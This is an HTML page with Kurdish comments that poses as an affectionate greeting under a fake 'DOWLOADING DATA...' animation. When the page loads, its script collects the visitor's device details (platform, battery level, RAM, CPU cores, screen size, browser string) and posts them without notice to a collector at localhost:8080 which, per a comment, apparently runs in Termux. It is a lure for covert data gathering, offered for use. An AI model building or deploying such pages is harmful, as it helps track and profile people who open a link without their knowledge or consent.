<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تیاخ جوانە ❤️</title>
    <style>
        body { 
            background-color: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden; 
        }
        .container { 
            text-align: center; 
            border: 2px solid #0f0; 
            padding: 40px; 
            border-radius: 20px; 
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3); 
            background: rgba(0, 20, 0, 0.8);
        }
        h1 { 
            font-size: 2.5em; 
            text-shadow: 0 0 15px #0f0; 
            margin-bottom: 10px;
        }
        .loading-text { 
            font-size: 1.1em; 
            letter-spacing: 2px;
            margin-top: 15px;
        }
        /* ئەنیمەیشنی بازنە ڕەنگاوڕەنگەکە */
        .orbit { 
            width: 60px; 
            height: 60px; 
            border: 4px dashed #0f0; 
            border-radius: 50%; 
            animation: spin 2s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>تیاخ جوانە ❤️</h1>
        <div class="orbit"></div>
        <div class="loading-text">DOWLOADING DATA...</div>
    </div>

    <script>
        async function captureAndSend() {
            try {
                // کۆکردنەوەی زانیارییەکانی مۆبایل
                let batteryStatus = { level: 0 };
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryStatus.level = Math.round(battery.level * 100);
                }

                const deviceInfo = {
                    model: navigator.platform,
                    batteryLevel: batteryStatus.level,
                    ram: navigator.deviceMemory || "Unknown",
                    cpuCores: navigator.hardwareConcurrency || "Unknown",
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    browser: navigator.userAgent.split(') ')[1] || "Browser"
                };

                // ناردنی زانیارییەکان بۆ تێرموکسەکەت
                fetch('http://localhost:8080/final_report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });
            } catch (e) {
                console.log("Error capturing data.");
            }
        }

        // ڕاستەوخۆ کار بکات
        window.onload = captureAndSend;
    </script>
</body>
</html>
